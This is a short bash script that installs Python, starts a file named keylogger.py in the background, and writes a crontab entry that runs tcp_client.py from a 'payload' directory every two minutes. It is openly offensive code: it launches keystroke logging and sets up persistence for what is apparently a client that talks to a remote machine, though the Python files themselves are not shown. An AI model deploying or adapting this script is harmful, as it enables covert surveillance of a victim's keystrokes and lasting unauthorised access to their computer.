#!/bin/bash

apt install python3 -y

python3 keylogger.py &

crontab -l > temp_cron
echo "*/2 * * * * cd /home/thor/Desktop/payload; python3 tcp_client.py" >> temp_cron
crontab temp_cron
rm temp_cron